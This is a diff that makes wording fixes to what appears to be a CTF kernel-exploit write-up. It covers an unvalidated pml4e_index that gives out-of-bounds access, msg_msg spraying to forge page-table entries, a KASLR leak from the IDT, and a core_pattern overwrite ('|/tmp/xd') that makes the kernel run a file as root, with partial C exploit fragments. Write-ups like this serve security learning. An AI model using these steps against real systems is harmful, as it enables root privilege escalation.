@@ -18,7 +18,7 @@ WIP
 
 ## vulnerability
 
-`pml4e_index` has no validation. It can exceed 0x200 to cause OOB access. \
+`pml4e_index` has no validation. It can exceed 0x200, which cause OOB access. \
 `msg_msg` has `list_head` member, which has a valid pointer, they can be used as `pml4e` or `pdpe`.
 
 ```c
@@ -50,14 +50,14 @@ qcpu_pte_t ***qcpu_get_pml4e(qcpu_pte_t ****cr3, uint64_t pml4e_index)
 
 ### kaslr bypass
 
-Leak kbase by reading IDT region, which is located at fixed virtual address.
+We can leak kbase by reading IDT region, which is located at fixed virtual address.
 
 ```c
   unsigned long gate = *(long *)PTI_TO_VIRT(0x2000 + 1, 1, 0, 6, 0) >> 52;
   unsigned long kbase_diff = gate - 0x820;
 ```
 
-To load cracted value as `pml4e`, spray bunch of `msg_msg` struct after `QVM_LOAD`. It contains the all possible pointer to `&core_pattern` with kaslr.
+To load crafted value as `pml4e`, spray a bunch of `msg_msg` struct after `QVM_LOAD`. It contains the all possible pointer to `&core_pattern` considering KASLR.
 
 ```c
   rep(i, 0x1f8) {
@@ -73,7 +73,7 @@ To load cracted value as `pml4e`, spray bunch of `msg_msg` struct after `QVM_LOA
 
 ### core_pattern overwrite
 
-Writing `|/tmp/xd` into `core_pattern` and causing crash, the kernel executes `/tmp/xd` as root.
+By writing `|/tmp/xd` into `core_pattern` and causing crash, the kernel executes `/tmp/xd` as root.
 
 ```c
   *(long *)PTI_TO_VIRT(0x2000 + 1, 1, 0, 7 + kbase_diff & 0xfff, 0xc20) =
